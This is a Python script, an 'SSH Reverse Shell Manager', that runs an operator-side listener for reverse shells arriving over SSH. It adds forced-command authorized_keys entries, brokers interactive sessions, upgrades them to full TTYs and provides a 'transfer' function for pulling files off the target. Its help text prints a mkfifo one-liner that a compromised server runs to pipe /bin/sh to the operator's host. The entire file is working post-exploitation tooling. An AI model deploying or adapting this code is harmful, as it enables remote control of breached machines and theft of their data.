#!/usr/bin/env python3
"""SSH Reverse Shell Manager"""

import hashlib
import os
import pwd
import select
import signal
import socket
import sys
import time

SCRIPT_PATH = os.path.realpath(__file__)
HOSTNAME = socket.gethostname()
SESSION_DIR = "/tmp/sshshell"
FILES_DIR = os.path.join(SESSION_DIR, "files")
BASE_PORT = 18000
BUF_SIZE = 4096


def pty_script(user):
    return f"""SSH_COMMAND=`ps -af | grep {user} | grep -Eo 'ssh .*'`
SSH_IDENTITY=`echo $SSH_COMMAND | grep -Eo "\\-i [^ ]+"`
SSH_SERVER=`echo $SSH_COMMAND | grep -Eo "{user}@[^ ]+"`
SSH_COMMAND="ssh -q -o \\"StrictHostKeyChecking no\\" -o \\"UserKnownHostsFile /dev/null\\" ${{SSH_IDENTITY}} ${{SSH_SERVER}}"
export SSH_COMMAND
{{
  which python3 && python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null
}} ||
{{
  which python2 && python2 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null
}} ||
{{
  which python && python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null
}} ||
{{
  which script && script /dev/null 2>/dev/null
}} ||
echo No pty available
eval ${{SSH_COMMAND}} disconnect
exit
"""


def rc_script(rows, cols):
    return f"""export SHELL=/bin/bash
export TERM=xterm-256color
stty rows {rows} columns {cols}
transfer() {{
  if [ $# -gt 0 ]; then
    cat "$1" | eval $SSH_COMMAND transfer "$1"
  else
    cat | eval $SSH_COMMAND transfer
  fi
}}
clear
id
"""


def usage(user):
    sys.stderr.write(
        f"Usage: {sys.argv[0]} [OPTIONS] [-c | -a <SSH public key> | -r <SSH public key>]\n"
        f"  -c                    Connect to the remote shell endpoint\n"
        f"  -a <SSH public key>   Add <SSH public key> to authorized_keys\n"
        f"  -r <SSH public key>   Remove <SSH public key> from authorized_keys\n"
        f"  DEFAULT               Listen for incoming connections\n"
        f"\n"
        f"  Options:\n"
        f"      -u <user>   The user under which to configure SSH keys (default: '{user}')\n"
        f"      -s          Do not attempt to launch a full TTY when connecting to the\n"
        f"                  remote endpoint\n"
        f"\n"
        f"Run the following command on the remote server to connect the reverse shell:\n"
        f"  mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file>"
        f' -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"'
        f" {user}@{HOSTNAME} > /tmp/f; rm /tmp/f\n"
    )


def add_key(user, pubkey):
    if os.path.isfile(pubkey):
        with open(pubkey) as f:
            pubkey = f.read().strip()

    key_id = hashlib.sha1(pubkey.encode()).hexdigest()
    pw = pwd.getpwnam(user)
    ssh_dir = os.path.join(pw.pw_dir, ".ssh")
    auth_keys_path = os.path.join(ssh_dir, "authorized_keys")

    os.makedirs(ssh_dir, exist_ok=True)
    os.chown(ssh_dir, pw.pw_uid, pw.pw_gid)
    os.chmod(ssh_dir, 0o700)

    if not os.path.exists(auth_keys_path):
        open(auth_keys_path, "a").close()
    os.chown(auth_keys_path, pw.pw_uid, pw.pw_gid)
    os.chmod(auth_keys_path, 0o600)

    with open(auth_keys_path) as f:
        existing = f.read()

    if key_id in existing:
        print(f"SSH public key {user} => {pubkey} already exists")
        return

    forced_cmd = f'command="{SCRIPT_PATH} -c"'
    options = f"no-agent-forwarding,no-pty,no-port-forwarding,no-user-rc,no-X11-forwarding,{forced_cmd}"
    entry = f"# SSHREVERSE_{key_id}\n{options} {pubkey}\n"

    with open(auth_keys_path, "w") as f:
        f.write(entry + existing)

    print(f"Adding SSH public key {user} => {pubkey}")
    print(
        f"Run the following command on the remote server to connect the reverse shell:\n"
        f"  mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file>"
        f' -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"'
        f" {user}@{HOSTNAME} > /tmp/f; rm /tmp/f"
    )


def remove_key(user, pubkey):
    if os.path.isfile(pubkey):
        with open(pubkey) as f:
            pubkey = f.read().strip()

    key_id = hashlib.sha1(pubkey.encode()).hexdigest()
    home = pwd.getpwnam(user).pw_dir
    auth_keys_path = os.path.join(home, ".ssh", "authorized_keys")

    if not os.path.exists(auth_keys_path):
        print(f"SSH public key {user} => {pubkey} does not exist")
        return

    with open(auth_keys_path) as f:
        lines = f.readlines()

    new_lines = []
    skip_next = False
    found = False
    for line in lines:
        if skip_next:
            skip_next = False
            continue
        if key_id in line:
            skip_next = True
            found = True
            continue
        new_lines.append(line)

    if not found:
        print(f"SSH public key {user} => {pubkey} does not exist")
        return

    print(f"Removing SSH public key {user} => {pubkey}")
    with open(auth_keys_path, "w") as f:
        f.writelines(new_lines)


def handle_connection():
    """Forced command handler - bridges SSH channel to a local TCP socket."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    os.chmod(SESSION_DIR, 0o777)

    ssh_client = os.environ.get("SSH_CLIENT", "").split()
    client_ip = ssh_client[0] if ssh_client else "unknown"
    port = BASE_PORT

    while True:
        session_id = f"{client_ip}_{port}"
        if not os.path.exists(os.path.join(SESSION_DIR, session_id)):
            break
        port += 1

    session_file = os.path.join(SESSION_DIR, session_id)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    conn = None

    def cleanup(*_):
        try:
            server.close()
        except OSError:
            pass
        try:
            os.unlink(session_file)
        except OSError:
            pass

    signal.signal(signal.SIGTERM, lambda *_: (cleanup(), sys.exit(0)))
    signal.signal(signal.SIGHUP, lambda *_: (cleanup(), sys.exit(0)))

    try:
        server.bind(("127.0.0.1", port))
        server.listen(1)

        with open(session_file, "w") as f:
            for key, value in os.environ.items():
                f.write(f"{key}={value}\n")

        conn, _ = server.accept()
        server.close()

        stdin_fd = sys.stdin.fileno()
        stdout_fd = sys.stdout.fileno()

        while True:
            readable, _, _ = select.select([stdin_fd, conn], [], [])
            for fd in readable:
                if fd == stdin_fd:
                    data = os.read(stdin_fd, BUF_SIZE)
                    if not data:
                        return
                    conn.sendall(data)
                else:
                    data = conn.recv(BUF_SIZE)
                    if not data:
                        return
                    os.write(stdout_fd, data)
    except (BrokenPipeError, ConnectionResetError, OSError):
        pass
    finally:
        if conn:
            try:
                conn.close()
            except OSError:
                pass
        cleanup()


def handle_transfer():
    """Receive a file from the remote."""
    ssh_client = os.environ.get("SSH_CLIENT", "").split()
    client_ip = ssh_client[0] if ssh_client else "unknown"
    original_cmd = os.environ.get("SSH_ORIGINAL_COMMAND", "")
    parts = original_cmd.split(None, 1)
    filename = parts[1].replace("/", "_") if len(parts) > 1 else f"output_{int(time.time())}"

    client_dir = os.path.join(FILES_DIR, client_ip)
    os.makedirs(client_dir, exist_ok=True)

    filepath = os.path.join(client_dir, filename)
    if os.path.exists(filepath):
        count = 1
        while os.path.exists(f"{filepath}.{count}"):
            count += 1
        filepath = f"{filepath}.{count}"

    print(f"File transfer mode saving to {client_ip}/{os.path.basename(filepath)}", flush=True)
    with open(filepath, "wb") as f:
        while True:
            data = sys.stdin.buffer.read(BUF_SIZE)
            if not data:
                break
            f.write(data)
    print(f"Received {os.path.getsize(filepath)} bytes")


def handle_disconnect():
    """Clean up sessions for the disconnecting client."""
    ssh_client = os.environ.get("SSH_CLIENT", "").split()
    if not ssh_client:
        return
    client_ip = ssh_client[0]

    if not os.path.isdir(SESSION_DIR):
        return

    for entry in os.listdir(SESSION_DIR):
        if entry.startswith(f"{client_ip}_"):
            path = os.path.join(SESSION_DIR, entry)
            if os.path.isfile(path):
                try:
                    os.unlink(path)
                except OSError:
                    pass


def forward(sock):
    """Bidirectional forwarding without raw terminal."""
    stdin_fd = sys.stdin.fileno()
    stdout_fd = sys.stdout.fileno()
    try:
        while True:
            readable, _, _ = select.select([stdin_fd, sock], [], [])
            for fd in readable:
                if fd == stdin_fd:
                    data = os.read(stdin_fd, BUF_SIZE)
                    if not data:
                        return
                    sock.sendall(data)
                else:
                    data = sock.recv(BUF_SIZE)
                    if not data:
                        return
                    os.write(stdout_fd, data)
    except (BrokenPipeError, ConnectionResetError, OSError):
        pass
    finally:
        sock.close()


def forward_raw(sock):
    """Bidirectional forwarding with raw terminal for full TTY support."""
    import termios
    import tty

    stdin_fd = sys.stdin.fileno()
    stdout_fd = sys.stdout.fileno()
    old_tty = termios.tcgetattr(stdin_fd)

    def on_resize(signum, frame):
        try:
            size = os.get_terminal_size(stdin_fd)
            sock.sendall(f"stty rows {size.lines} columns {size.columns}\n".encode())
        except (OSError, BrokenPipeError):
            pass

    old_sigwinch = signal.getsignal(signal.SIGWINCH)
    signal.signal(signal.SIGWINCH, on_resize)
    try:
        tty.setraw(stdin_fd)
        while True:
            readable, _, _ = select.select([stdin_fd, sock], [], [])
            for fd in readable:
                if fd == stdin_fd:
                    data = os.read(stdin_fd, BUF_SIZE)
                    if not data:
                        return
                    sock.sendall(data)
                else:
                    data = sock.recv(BUF_SIZE)
                    if not data:
                        return
                    os.write(stdout_fd, data)
    except (BrokenPipeError, ConnectionResetError, OSError):
        pass
    finally:
        signal.signal(signal.SIGWINCH, old_sigwinch)
        termios.tcsetattr(stdin_fd, termios.TCSADRAIN, old_tty)
        sock.close()
        os.system("reset")


def operator_shell(user, simple):
    """Operator interface - list sessions and connect."""
    os.makedirs(FILES_DIR, exist_ok=True)
    os.chmod(SESSION_DIR, 0o777)

    sessions = sorted(
        e for e in os.listdir(SESSION_DIR)
        if os.path.isfile(os.path.join(SESSION_DIR, e))
    )

    if not sessions:
        print("No current connections")
        return

    if len(sessions) == 1:
        session_id = sessions[0]
    else:
        print("Choose a connection:")
        for i, s in enumerate(sessions, 1):
            print(f"\t{i}: {s}")
        print()
        try:
            choice = input().strip()
        except EOFError:
            return
        if not choice.isdigit():
            print(f"Not a number '{choice}'")
            return
        idx = int(choice)
        if idx < 1 or idx > len(sessions):
            print(f"Invalid connection number '{choice}'")
            return
        session_id = sessions[idx - 1]
        print(f"You chose {choice}: {session_id}")

    port = int(session_id.rsplit("_", 1)[-1])
    print(f"Connecting to {session_id}...", flush=True)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("127.0.0.1", port))
    except ConnectionRefusedError:
        print(f"Connection refused on port {port} - session may be stale")
        return

    if simple or not os.isatty(sys.stdin.fileno()):
        print(
            "If you would like to upgrade to a full TTY:\n"
            "* Launch a pty:\n"
            "  $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "  or\n"
            "  $ script\n"
            "* Background the process (Ctrl+z)\n"
            "* Setup the environment:\n"
            "  $ stty raw -echo\n"
            "  $ fg\n"
            "  $ reset; export SHELL=bash; export TERM=xterm-256color;"
            " stty rows `tput lines` columns `tput cols`"
        )
        forward(sock)
    else:
        size = os.get_terminal_size(sys.stdin.fileno())
        sock.sendall(pty_script(user).encode())
        sock.sendall(rc_script(size.lines, size.columns).encode())
        forward_raw(sock)


def main():
    user = "rshell"
    action = None
    simple = False
    pubkey = None

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "-u" and i + 1 < len(args):
            i += 1
            user = args[i]
        elif args[i] == "-a":
            action = "add"
            pubkey = " ".join(args[i + 1:])
            break
        elif args[i] == "-r":
            action = "remove"
            pubkey = " ".join(args[i + 1:])
            break
        elif args[i] == "-c":
            action = "connection"
        elif args[i] == "-s":
            simple = True
        elif args[i] in ("-h", "--help"):
            usage(user)
            return
        i += 1

    original_cmd = os.environ.get("SSH_ORIGINAL_COMMAND", "")
    ssh_cmd = original_cmd.split()[0] if original_cmd else ""

    if ssh_cmd == "transfer":
        handle_transfer()
        return
    if ssh_cmd == "disconnect":
        handle_disconnect()
        return

    if action == "connection":
        handle_connection()
        return

    try:
        pwd.getpwnam(user)
    except KeyError:
        print(f"Remote shell user '{user}' does not exist, exiting...")
        return

    if action == "add":
        add_key(user, pubkey)
    elif action == "remove":
        remove_key(user, pubkey)
    else:
        operator_shell(user, simple)


if __name__ == "__main__":
    main()
